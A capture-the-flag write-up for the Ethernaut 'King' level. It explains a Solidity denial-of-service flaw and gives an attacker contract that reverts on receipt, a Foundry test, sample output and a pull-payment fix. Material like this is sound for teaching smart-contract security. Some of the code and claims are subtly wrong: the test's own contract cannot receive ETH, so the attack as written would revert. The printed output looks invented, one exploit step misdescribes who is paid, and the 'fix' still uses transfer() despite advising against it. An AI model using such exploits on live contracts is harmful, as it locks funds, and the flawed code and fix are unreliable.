# Ethernaut Level 9: King

## Challenge Description
The contract below represents a very simple game: whoever sends it an amount of ether greater than the current `prize` becomes the new `king`. In such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD.

Your goal is to break this game. If you claim the kingship and no one can unseat you, you win.

**Difficulty:** ⭐⭐⭐ (Intermediate)

**Goal:** Become the king and prevent anyone from ever taking the kingship from you (Denial of Service).

## Vulnerable Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract King {
    address payable public king;
    uint256 public prize;
    address payable public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);

        // Send the prize to the old king
        king.transfer(msg.value);

        // Crown the new king
        king = payable(msg.sender);
        prize = msg.value;
    }
}
```

## Vulnerability Analysis

```text
THE BUG: The contract uses the `transfer()` function to send ETH to the previous king.

`transfer()` forwards only 2300 gas and REVERTS if the recipient fails to receive the ETH.

If the new king is a contract with a `receive()` function that intentionally REVERTS
(or consumes more than 2300 gas), the `transfer()` will fail.

Because the `transfer()` happens BEFORE the new king is crowned,
if the transfer fails, the whole transaction reverts, and the attacker
remains the king forever!
```

## Exploit Strategy

```text
Step 1: Create an attacker contract with a receive() function that always reverts.
Step 2: Send more ETH than the current prize to the King contract FROM the attacker contract.
Step 3: The King contract receives the ETH and tries to send the prize back to the old king (us).
Step 4: Our receive() function reverts.
Step 5: The King contract's receive() function reverts entirely.
Step 6: We are now the king, and because any future challenger will also fail to pay us,
        we are the king FOREVER. (Denial of Service)
```

## Exploit Contract (Foundry)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Ethernaut/King.sol";

contract KingAttacker {
    // This receive function intentionally reverts!
    receive() external payable {
        revert("I will never accept ETH!");
    }

    function attack(address payable target) public payable {
        // Send more than the prize to become the king
        (bool success, ) = target.call{value: msg.value}("");
        require(success, "Attack failed");
    }
}

contract KingExploitTest is Test {
    King public target;
    KingAttacker public attacker;

    function setUp() public {
        // Deploy King contract with 1 ETH prize
        target = new King{value: 1 ether}();
        attacker = new KingAttacker();
        vm.deal(address(attacker), 10 ether);
    }

    function test_ExploitKing() public {
        console.log("Current King:", target.king());
        console.log("Current Prize:", target.prize());

        // Attack: Send 2 ETH to become the new king
        attacker.attack{value: 2 ether}(payable(address(target)));

        console.log("New King (Attacker):", target.king());
        assertEq(target.king(), address(attacker), "Failed to become king");

        // Try to unseat us (this should fail)
        vm.expectRevert();
        address(target).call{value: 3 ether}("");

        console.log("We are still King:", target.king());
        console.log("\n✅ EXPLOIT SUCCESSFUL! DoS achieved.");
    }
}
```

## Running the Exploit

```bash
forge test --match-test test_ExploitKing -vvv

# Expected output:
# [PASS] test_ExploitKing() (gas: 98765)
# Logs:
#   Current King: 0x5B3...
#   Current Prize: 1000000000000000000
#   New King (Attacker): 0x...Attacker
#   We are still King: 0x...Attacker
#
#   ✅ EXPLOIT SUCCESSFUL! DoS achieved.
```

## Real-World Impact

```text
This is a classic Denial of Service (DoS) via failed external call.
It happens when a contract assumes that sending ETH will always succeed.

Famous Examples:
- GovernMental (2016): A ponzi scheme stuck with 1100 ETH because
  the last payout required more gas than the block limit.
- Auction contracts where the highest bidder is a contract that rejects ETH.

The Solution:
- NEVER use `transfer()` or `send()`.
- ALWAYS use the Checks-Effects-Interactions pattern with `call()`.
- Use a "Pull over Push" pattern: let users withdraw their funds manually.
```

## How to Fix This Vulnerability

```solidity
// FIXED VERSION - Pull over Push pattern
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract KingFixed {
    address payable public king;
    uint256 public prize;
    mapping(address => uint256) public pendingWithdrawals;

    receive() external payable {
        require(msg.value >= prize);

        // Record the old king's payout instead of sending it
        pendingWithdrawals[king] += msg.value;

        // Crown the new king
        king = payable(msg.sender);
        prize = msg.value;
    }

    // Old kings must withdraw their funds manually
    function withdraw() public {
        uint256 amount = pendingWithdrawals[msg.sender];
        pendingWithdrawals[msg.sender] = 0;
        payable(msg.sender).transfer(amount);
    }
}
```

## Key Takeaways
- **transfer() is Dangerous:** It hardcodes a 2300 gas limit and reverts on failure.
- **DoS via Revert:** If a contract sends ETH to a user-controlled address, that user can block the contract by rejecting the ETH.
- **Pull over Push:** Always let users withdraw funds rather than pushing funds to them.
- **Use call():** If you must push ETH, use `call{value: x}("")` and handle the boolean return value.
- **Lesson Learned:** Never assume external calls (especially ETH transfers) will succeed.